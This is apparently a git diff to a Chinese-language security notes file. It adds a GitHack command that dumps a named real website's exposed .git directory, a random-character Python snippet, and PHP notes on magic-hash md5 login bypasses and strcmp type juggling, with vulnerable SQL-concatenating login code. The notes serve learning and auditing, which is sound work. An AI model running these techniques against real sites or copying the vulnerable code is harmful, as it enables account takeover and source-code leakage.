@@ -1635,7 +1635,7 @@ if __name__ == '__main__':
             print item
 
 ```
-###[php表单加入Token防止重复提交]()
+###[php表单加入Token防止重复提交](https://www.waitalone.cn/php-form-sec-token.html)
 ```js
  <?php
 /*
@@ -1673,8 +1673,53 @@ if(isset($_POST['test'])){
 </form>
 
 ```
-###[git信息泄露利用工具]()
+###[git信息泄露利用工具](https://www.waitalone.cn/git-hack.html)
 ```js
 获取代码：https://github.com/lijiejie/GitHack
 GitHack.py http://www.hoolai.com/.git/
+```
+###[python随机汉字](https://segmentfault.com/q/1010000008241060)
+```js
+>>> print "".join(map(unichr, xrange(0x4e00, 0x9fa6))) 
+python 3
+>>> import random
+>>> all= "".join(map(chr, range(0x4e00, 0x9fa6)))
+>>> random.sample(all,2)
+['頴', '謆']
+```
+###[PHP特性引发安全隐患](https://www.waitalone.cn/php-sec-bugs.html)
+```js
+用户采用类似240610708 这样能够md5之后形成0e[0-9].*的hash串的密码时,
+同时网站的帐号体系也是以md5的形式存储，
+$result=query("'select password from user_tables where username='+$_POST[name]+'limit 0,1'");
+if (md5($_POST[password])==$result)
+echo "success";
+利用任意 QNKCDZO 这样能md5之后产生0e[0-9].*的密码就可以登录用户的帐号
+>>> md5('QNKCDZO')
+=> "0e830400451993494058024219903391"
+>>> md5('240610708')
+=> "0e462097431906509019562988736854"
+先注册密码为240610708的用户A。
+然后用密码QNKCDZO尝试登录用户A。
+倘若成功登录，则证明此网站采用了不完备的加密体制md5一次加密。
+先注册密码为0E33455555的用户A。
+然后用密码0E234230570345尝试登录用户A。
+倘若成功登录，则证明此网站采用了明文进行存储密码！
+strcmp("5", 5) => 0
+strcmp("15", 0xf) => 0
+strcmp(61529519452809720693702583126814, 61529519452809720000000000000000) => 0
+strcmp(NULL, false) => 0
+strcmp(NULL, "") => 0
+strcmp(NULL, 0) => -1
+strcmp(false, -1) => -2
+strcmp("15", NULL) => 2
+strcmp(NULL, "foo") => -3
+strcmp("foo", NULL) => 3
+strcmp("foo", false) => 3
+strcmp("foo", 0) => 1
+strcmp("foo", 5) => 1
+strcmp("foo", array()) => NULL + PHP Warning
+strcmp("foo", new stdClass) => NULL + PHP Warning
+strcmp(function(){}, "") => NULL + PHP Warning
+
 ```
